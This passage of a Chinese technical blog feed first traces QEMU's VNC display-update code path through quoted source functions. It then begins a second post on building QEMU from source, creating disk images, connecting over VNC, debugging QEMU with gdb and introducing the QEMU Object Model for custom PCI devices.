应为 <code>vga_ops</code>，定义于 <code>hw/display/vga.c</code> 中，其 <code>gfx_update</code> 指针为 <code>vga_update_display</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps vga_ops = &#123;<br>    .invalidate  = vga_invalidate_display,<br>    .gfx_update  = vga_update_display,<br>    .text_update = vga_update_text,<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这里主要是根据指定的硬件决定的，默认的图形界面便是 <code>vga_ops</code>，如果你在启动时指定了一个 QXL 显卡，那么这里就应该是 <code>qxl_ops</code>，最终调用到 <code>qxl_hw_update()</code></p></blockquote><p>该函数定义于 <code>hw/display/vga.c</code> 中，主要作用就是根据显示模式调用不同的更新函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vga_update_display</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    VGACommonState *s = opaque;<br>    DisplaySurface *surface = qemu_console_surface(s-&gt;con);<br>    <span class="hljs-type">int</span> full_update, graphic_mode;<br><br>    qemu_flush_coalesced_mmio_buffer();<br><br>    <span class="hljs-keyword">if</span> (surface_bits_per_pixel(surface) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">/* nothing to do */</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        full_update = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (!(s-&gt;ar_index &amp; <span class="hljs-number">0x20</span>)) &#123;<br>            graphic_mode = GMODE_BLANK;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            graphic_mode = s-&gt;gr[VGA_GFX_MISC] &amp; VGA_GR06_GRAPHICS_MODE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (graphic_mode != s-&gt;graphic_mode) &#123;<br>            s-&gt;graphic_mode = graphic_mode;<br>            s-&gt;cursor_blink_time = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);<br>            full_update = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">switch</span>(graphic_mode) &#123;<br>        <span class="hljs-keyword">case</span> GMODE_TEXT:<br>            vga_draw_text(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_GRAPH:<br>            vga_draw_graphic(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_BLANK:<br>        <span class="hljs-keyword">default</span>:<br>            vga_draw_blank(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些 <code>vga_draw_*</code> 函数最后都会调用到 <code>dpy_gfx_update()</code> 将更新推送到显示设备上，其定义于 <code>ui/console.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">dpy_gfx_update</span><span class="hljs-params">(QemuConsole *con, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    DisplayState *s = con-&gt;ds;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">int</span> width = qemu_console_get_width(con, x + w);<br>    <span class="hljs-type">int</span> height = qemu_console_get_height(con, y + h);<br><br>    x = MAX(x, <span class="hljs-number">0</span>);<br>    y = MAX(y, <span class="hljs-number">0</span>);<br>    x = MIN(x, width);<br>    y = MIN(y, height);<br>    w = MIN(w, width - x);<br>    h = MIN(h, height - y);<br><br>    <span class="hljs-keyword">if</span> (!qemu_console_is_visible(con)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    dpy_gfx_update_texture(con, con-&gt;surface, x, y, w, h);<br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (con != (dcl-&gt;con ? dcl-&gt;con : active_console)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update) &#123;<br>            dcl-&gt;ops-&gt;dpy_gfx_update(dcl, x, y, w, h);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要流程如下：</p><ul><li>若 QemuConsole 不可视，直接返回</li><li>调用 <code>dpy_gfx_update_texture()</code>，其最终会调用到 <code>con-&gt;gl-&gt;ops-&gt;dpy_gl_ctx_update_texture()</code>，这一块是与 GL 相关的操作，这里暂且不展开</li><li>遍历 QemuConsole 上的 DisplayChangeListener，调用 <code>dcl-&gt;ops-&gt;dpy_gfx_update()</code>，更新 dcl 对应的 display 设备</li></ul><p>对于 VNC 而言，<code>dcl-&gt;ops-&gt;dpy_gfx_update</code> 指针应为 <code>vnc_dpy_update()</code> 函数，定义于 <code>ui/vnc.c</code> 中，主要就是调用 <code>vnc_set_area_dirty()</code> 将一块区域标记为 dirty：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_dpy_update</span><span class="hljs-params">(DisplayChangeListener *dcl,</span><br><span class="hljs-params">                           <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> *<span class="hljs-title">s</span> =</span> &amp;vd-&gt;guest;<br><br>    vnc_set_area_dirty(s-&gt;dirty, vd, x, y, w, h);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终这些被标记为 dirty 的区域会在 <code>vnc_refresh()</code> 中调用 <code>vnc_refresh_server_surface()</code> 时被进一步处理，在 <code>vnc_update_client()</code> 中变为新的 VncJob 链到全局链表上</p><h2 id="四、vnc-client-update-创建新的-VncJob-挂载到全局链表上">四、vnc_client_update - 创建新的 VncJob 挂载到全局链表上</h2><p>当前面我们将特定的显示区域标记为 dirty 之后，最终会由 <code>vnc_update_client()</code> 函数来扫描 dirty 区域，并创建相应的 VncJob 挂载到全局的 queue 上，因此最后实际上还是由 vnc worker thread 完成推送的任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_update_client</span><span class="hljs-params">(VncState *vs, <span class="hljs-type">int</span> has_dirty)</span><br>&#123;<br>    VncDisplay *vd = vs-&gt;vd;<br>    VncJob *job;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> height, width;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (vs-&gt;disconnecting) &#123;<br>        vnc_disconnect_finish(vs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    vs-&gt;has_dirty += has_dirty;<br>    <span class="hljs-keyword">if</span> (!vnc_should_update(vs)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vs-&gt;has_dirty &amp;&amp; vs-&gt;update != VNC_STATE_UPDATE_FORCE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Send screen updates to the vnc client using the server</span><br><span class="hljs-comment">     * surface and server dirty map.  guest surface updates</span><br><span class="hljs-comment">     * happening in parallel don&#x27;t disturb us, the next pass will</span><br><span class="hljs-comment">     * send them to the client.</span><br><span class="hljs-comment">     */</span><br>    job = vnc_job_new(vs);  <span class="hljs-comment">// 创建新的 VncJob</span><br><br>    height = pixman_image_get_height(vd-&gt;server);<br>    width = pixman_image_get_width(vd-&gt;server);<br><br>    y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// 扫描 dirty 区域</span><br>        <span class="hljs-type">int</span> x, h;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = find_next_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty,<br>                                             height * VNC_DIRTY_BPL(vs),<br>                                             y * VNC_DIRTY_BPL(vs));<br>        <span class="hljs-keyword">if</span> (offset == height * VNC_DIRTY_BPL(vs)) &#123;<br>            <span class="hljs-comment">/* no more dirty bits */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        y = offset / VNC_DIRTY_BPL(vs);<br>        x = offset % VNC_DIRTY_BPL(vs);<br>        x2 = find_next_zero_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty[y],<br>                                VNC_DIRTY_BPL(vs), x);<br>        bitmap_clear(vs-&gt;dirty[y], x, x2 - x);<br>        h = find_and_clear_dirty_height(vs, y, x, x2, height);<br>        x2 = MIN(x2, width / VNC_DIRTY_PIXELS_PER_BIT);<br>        <span class="hljs-keyword">if</span> (x2 &gt; x) &#123;<br>            <span class="hljs-comment">// 创建新的 VncRect，挂载到 VncJob 上</span><br>            n += vnc_job_add_rect(job, x * VNC_DIRTY_PIXELS_PER_BIT, y,<br>                                  (x2 - x) * VNC_DIRTY_PIXELS_PER_BIT, h);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!x &amp;&amp; x2 == width / VNC_DIRTY_PIXELS_PER_BIT) &#123;<br>            y += h;<br>            <span class="hljs-keyword">if</span> (y == height) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    vs-&gt;job_update = vs-&gt;update;<br>    vs-&gt;update = VNC_STATE_UPDATE_NONE;<br>    vnc_job_push(job);  <span class="hljs-comment">// 挂载到全局 queue 上</span><br>    vs-&gt;has_dirty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，Qemu 中 VNC 的工作流程基本分析完毕</p><h1>0xFF.总览</h1><p>最后让我们重新看一下 Qemu VNC 的基本架构，这里再放一张从<a href="https://zhuanlan.zhihu.com/p/69568087">知乎</a>上偷来的一个 Qemu VNC 的基本架构图：</p><p><img src="https://s2.loli.net/2022/07/21/7BcC1jzxESl3ZWt.png" alt="image.png"></p><p>在 Qemu 中内部的显示结构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><p>最终的更新调用链路则如下所示：</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;vnc，🐕都不用&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="VNC" scheme="http://blog.arttnba3.cn/tags/VNC/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x00】Qemu - I：Qemu 简易食用指南</title>
    <link href="http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/"/>
    <id>http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/</id>
    <published>2022-07-15T08:45:17.000Z</published>
    <updated>2023-04-12T17:16:28.484Z</updated>
    
    <content type="html"><![CDATA[<p>不如 VMWare👋</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>Qemu 是一款开源的虚拟机软件，支持多种不同架构的模拟（Emulation）以及配合 kvm 完成当前架构的虚拟化（Virtualization）的特性，是当前最火热的开源虚拟机软件</p><p><img src="https://s2.loli.net/2022/07/22/jfIDUCx5ZtMsHAY.png" alt="image.png"></p><p>Qemu 的基本运行架构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/26/9L7HtFUQlyZdwXD.png" alt="image.png"></p><p>本篇文章笔者将简要叙述如何从源码编译特定架构的 Qemu 并进行一定程度的改造工作</p><h2 id="PRE-安装依赖">PRE.安装依赖</h2><p>大概需要安装这些依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt -y install ninja-build build-essential zlib1g-dev pkg-config libglib2.0-dev binutils-dev libpixman-1-dev libfdt-dev</span><br></code></pre></td></tr></table></figure><h1>0x01.从源码编译 QEMU</h1><h2 id="一、获取-QEMU-源码">一、获取 QEMU 源码</h2><p>大概有两种途径：从官网下载或是直接从 Qemu 的GitHub 仓库拉下来。</p><h3 id="I-官网下载源码">I.官网下载源码</h3><p>前往 <a href="https://download.qemu.org">qemu 的官网</a>进行下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://download.qemu.org/qemu-7.0.0.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf qemu-7.0.0.tar.xz</span><br></code></pre></td></tr></table></figure><h3 id="II-GitHub-获取源码">II. GitHub 获取源码</h3><p>直接从 <a href="https://github.com/qemu/qemu">GitHub</a> 上面拉也行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> git@github.com:qemu/qemu.git</span><br></code></pre></td></tr></table></figure><h2 id="二、配置编译选项">二、配置编译选项</h2><p>接下来创建 build 目录并配置对应的编译选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build</span><br><span class="hljs-meta prompt_">build$ </span><span class="language-bash">../qemu-7.0.0/configure --enable-kvm --target-list=x86_64-softmmu --enable-debug</span><br></code></pre></td></tr></table></figure><p>这里我们手动指定了这几个编译选项：</p><ul><li><code>--enable-kvm</code>：开启 kvm 支持</li><li><code>--target-list=&lt;架构名&gt;</code>：指定要编译的 CPU 架构，这里我们指定为 <code>x86_64-softmmu</code> 即表示我们要编译 x86 架构的 64位 CPU</li><li><code>--enable-debug</code>：能够对 Qemu 进行调试</li></ul><blockquote><p>如果我们不指定的话会把所有架构都编译一遍，不过这里笔者只需要 x86 的；）</p></blockquote><h2 id="三、开始编译">三、开始编译</h2><p>直接 make 就完事了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>需要花的时间还是不短的，在笔者的小破服务器上编译大概需要十几分钟左右，大概编译了两千多个文件，完成之后在当前目录下就会有一个热乎乎的可执行文件 <code>qemu-system_x86-64</code>，这个就是 Qemu 的本体了</p><p>之后可以 make install 给他安到 bin 里边，这样就能直接从命令行启动了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><h1>0x02.构建系统镜像并使用 vnc 连接</h1><p>空有一个 <code>qemu</code> 的可执行文件还不行，我们最终还是要在 qemu 上面跑一个完整的操作系统的，那么这里有两种方法：</p><ul><li>使用 <code>qemu-img</code> 创建虚拟机镜像文件，通过 <code>-cdrom</code> 参数指定载入一个 ISO 镜像文件来安装一个现有的操作系统</li><li>使用 <code>debootstrap</code> 创建 ext4 硬盘镜像，并直接运行一个现成的裸的内核镜像文件（bzImage）</li></ul><h2 id="一、创建虚拟机镜像文件并通过-CDROM-安装-Ubuntu">一、创建虚拟机镜像文件并通过 CDROM 安装 Ubuntu</h2><h3 id="I-使用-qemu-img-创建虚拟机磁盘镜像文件">I.使用 <code>qemu-img</code> 创建虚拟机磁盘镜像文件</h3><p>这一步比较简单，主要是用 <code>build</code> 目录下的 <code>qemu-img</code> 来完成构建：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./build/qemu-img create -f qcow2 test.qcow2 20G</span><br>Formatting &#x27;test.qcow2&#x27;, fmt=qcow2 cluster_size=65536 extended_l2=off compression_type=zlib size=21474836480 lazy_refcounts=off refcount_bits=16<br></code></pre></td></tr></table></figure><p>这里的 <code>-f</code> 参数指定的第一个参数为镜像格式，这里使用 QEMU 最通用的格式 <code>qcow2</code>；第二个参数为文件路径；第三个参数为镜像大小</p><blockquote><p>参见<a href="https://docs.fedoraproject.org/zh-CN/Fedora/12/html/Virtualization_Guide/sect-Virtualization_Guide-Tips_and_tricks-Using_qemu_img.html">这里</a></p></blockquote><h3 id="II-通过-vnc-连接完成安装">II.通过 vnc 连接完成安装</h3><p>在 qemu 启动时通过 <code>-cdrom</code> 参数可以指定加载的ISO文件路径，这里笔者选择安装一个 Ubuntu 22.04：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso</span><br>VNC server running on ::1:5900<br></code></pre></td></tr></table></figure><p>参数说明如下：</p><ul><li><code>-m</code>：虚拟机的内存大小</li><li><code>-drive</code> ：qemu 启动时额外加载的设备，这里我们使用 <code>format=qcow2,file=test.qcow2</code> 指定了加载设备 <code>test.qcow2</code>、格式为 <code>qcow2</code></li><li><code>-enable-kvm</code> ：启用 kvm 模式，需要注意的是该选项<strong>要求以 root 权限运行</strong></li><li><code>-cdrom</code>：指定 qemu 启动时装载的光碟文件路径</li></ul><p>启动后 qemu 默认会在 5900 端口启动一个 VNC server，此时我们便能通过 VNC 连接到 qemu 上，需要注意的是这里<strong>只能在本地进行连接</strong></p><p>如果是运行在远程服务器上的话，我们还需要额外指定 <code>-vnc</code> 参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso -vnc yourip:0</span><br></code></pre></td></tr></table></figure><p>需要注意的是 <code>vnc</code> 参数中 ip 后面跟着的不是端口号，而是 <code>display numer</code>，对于默认的 <code>display 0</code> 而言其监听的端口号为 <code>5900</code>，而 <code>display 1</code> 就是 <code>5901</code> 端口，以此类推</p><p>之后我们便能通过 vnc 连接上远程服务器上的 qemu 了，这里笔者选择使用 <code>VNC Viewer</code> 进行连接：</p><p><img src="https://s2.loli.net/2022/07/11/3juM5iAgFERhYsS.png" alt="image.png"></p><p>成功连接上远程服务器上的 qemu：</p><p><img src="https://s2.loli.net/2022/07/11/UdlOA6DGaPFJqx2.png" alt="image.png"></p><p>之后就是常规的安装流程了，不过可能是由于 qemu 模拟显卡的问题（或者是 VNC 配置的问题），在一开始的时候安装界面的颜色会有点失真：</p><p><img src="https://s2.loli.net/2022/07/11/lsp4rnZqSdbcIGL.png" alt="image.png"></p><p>不过在安装准备结束的时候又恢复正常的颜色了，笔者目前推测应该是和显卡驱动有关：</p><p><img src="https://s2.loli.net/2022/07/11/g5jCb8yzmQYsvMd.png" alt="image.png"></p><p>之后就和正常使用虚拟机没有什么区别了，下次再次启动就不需要指定 <code>-cdrom</code> 参数了</p><p><img src="https://s2.loli.net/2022/07/11/WZiEx6vqnYapdl7.png" alt="image.png"></p><h2 id="二、构建-ext4-磁盘镜像并运行-kernel-bzImage">二、构建 ext4 磁盘镜像并运行 kernel bzImage</h2><p>如果你不需要一个完整的发行版 Linux 系统环境，只是想跑一个裸的简易的内核，也可以通过下面的方式完成：</p><h3 id="I-构建磁盘镜像">I.构建磁盘镜像</h3><p>这里我们使用 <code>debootstrap</code> 来创建ext4硬盘镜像，直接使用由 Google 团队为 syzkaller 构建磁盘镜像的脚步即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> image</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> image</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">./create-image.sh</span><br></code></pre></td></tr></table></figure><p>完成之后在当前目录下就会有一个热乎乎的 <code>stretch.img</code>，这便是 ext4 磁盘镜像文件了</p><blockquote><p>wget 的这一步<strong>需要翻墙</strong>（<code>raw.githubusercontent.com</code> 在国内似乎是被墙了，总之笔者记忆里从没成功在不翻墙的情况下成功上去过），若嫌麻烦可以直接 copy <a href="/download/create-image.sh">笔者已经下好的</a></p></blockquote><h3 id="II-获取-kernel-bzImage">II.获取 kernel bzImage</h3><p>这部分参见<a href="http://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/#0x01-%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F%EF%BC%88bzImage%EF%BC%89">这里</a></p><h3 id="III-运行-qemu-并通过-vnc-进行连接">III.运行 qemu 并通过 vnc 进行连接</h3><p>创建如下 bash 脚本并运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>qemu-system-x86_64 \<br>-m 2G \<br>-smp 2 \<br>-kernel ./bzImage \<br>-append <span class="hljs-string">&quot;root=/dev/sda&quot;</span> \<br>-drive file=./stretch.img,format=raw \<br>-enable-kvm \<br>-vnc yourip:0<br></code></pre></td></tr></table></figure><p>之后还是直接用 vnc 进行连接即可（如果只需要在本地运行的话可以不用附加 <code>-vnc</code> 参数，而是加上 <code>-nographic</code> 参数）：</p><p><img src="https://s2.loli.net/2022/07/12/yjcVlhtYOz4pQvC.png" alt="image.png"></p><h1>0x03. QEMU 源码调试</h1><p>QEMU 允许我们通过 <code>-s</code> 或是 <code>-gdb tcp::1234</code> 这样的附加参数来调试虚拟机（比如说调试 Linux kernel），但有的时候我们想要<strong>直接调试 QEMU 本体</strong>（比如说调试一些自己写的模拟设备），这个时候就需要我们将 Host 上的 QEMU 进程作为待调试对象</p><p>因为 QEMU 本身也是在 Host 上运行的一个进程，所以笔者这里给出一个比较直接的调试 QEMU 的办法：把 QEMU 本体启动起来后直接用 <code>ps</code> 找 QEMU 进程然后 gdb attach  即可像正常调试一个普通进程一样调试 QEMU：</p><p><img src="https://s2.loli.net/2023/04/13/ocrYWTQ4Nw3LEh5.png" alt="image.png"></p><p>如果是自己编译的 QEMU 这样就可以直接从源码进行调试了：</p><p><img src="https://s2.loli.net/2023/04/13/ol9OLkRDcusndU4.png" alt="image.png"></p><h1>0x04.简易 QEMU 设备编写</h1><p>虽然 Qemu 支持模拟多种设备，但是并不能涵盖现存所有的设备类型，同时有的时候出于一些特殊的目的我们也需要自定义一些设备，因此本节主要讲述如何在 Qemu 当中编写一个新的 PCI 类型的设备</p><blockquote><p>注1：在开始之前你可能需要补充一些<a href="https://arttnba3.cn/2022/08/20/HARDWARE-0X00-PCI_DEVICE/">PCI 设备的基础知识</a></p><p>注2：qemu 官方在 <code>hw/misc/edu.c</code> 中也提供了一个教学用的设备样例，red hat 则在 <code>hw/misc/pci-testdev.c</code> 中提供了一个测试设备，我们可以参考这两个设备来构建我们的设备</p></blockquote><h2 id="一、Qemu-Object-Model">一、Qemu Object Model</h2><p>虽然 Qemu 是使用 C 编写的，但是其代码也充满了 OOP 的思想，在 Qemu 当中有着一套叫做 <strong>Qemu Object Model</strong> 的东西来实现面向对象，主要由这四个组件构成：</p><ul><li><code>Type</code>：用来定义一个「类」的基本属性，例如类的名字、大小、构造函数等</li><li><code>Class</code>：用来定义一个「类」的静态内容，例如类中存储的静态数据、方法函数指针等</li><li><code>Object</code>：动态分配的一个「类」的具体的实例（instance），储存类的动态数据</li><li><code>Property</code>：动态对象数据的访问器（accessor），可以通过监视器接口进行检查</li></ul><p>类似于 Golang，在 QOM 当中使用成员嵌套的方式来完成类的继承，父类作为类结构体的第一个成员 <code>parent</code> 而存在，因此也不支持多继承</p><blockquote><p>参见这个<a href="https://www.linux-kvm.org/images/f/f6/2012-forum-QOM_CPU.pdf">ppt</a></p></blockquote><h3 id="I、TypeInfo-类的基本属性">I、TypeInfo - 类的基本属性</h3><p><code>TypeInfo</code> 这一结构体用来定义一个「类」的基本属性，该结构体定义于 